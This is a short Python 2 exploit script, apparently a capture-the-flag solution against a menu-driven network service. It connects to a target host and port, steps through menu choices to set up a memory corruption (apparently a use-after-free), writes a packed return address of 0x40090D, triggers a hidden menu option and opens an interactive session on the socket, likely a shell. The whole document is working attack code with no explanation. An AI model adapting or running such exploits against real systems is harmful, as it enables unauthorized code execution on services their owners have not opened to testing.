#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *
import random
import time
def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
#s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
print recvuntil("Enter your choice:\n")
s.send("2\n")
print s.recv(1024)
s.send("3\n")
print s.recv(1024)
s.send("AAAA\n")
print recvuntil("Enter your choice:\n")
s.send("3\n")
print s.recv(1024)
s.send("3\n")
print s.recv(1024)
s.send("CCCC\n")
print recvuntil("Enter your choice:\n")
s.send("4\n")
print s.recv(1024)
s.send("1\n")
print recvuntil("Enter your choice:\n")
s.send("2\n")
print s.recv(1024)
s.send("3\n")
print s.recv(1024)
s.send(p64(0x40090D)+"\n")
print recvuntil("Enter your choice:\n")
s.send("4919\n")
interactive()
s.close()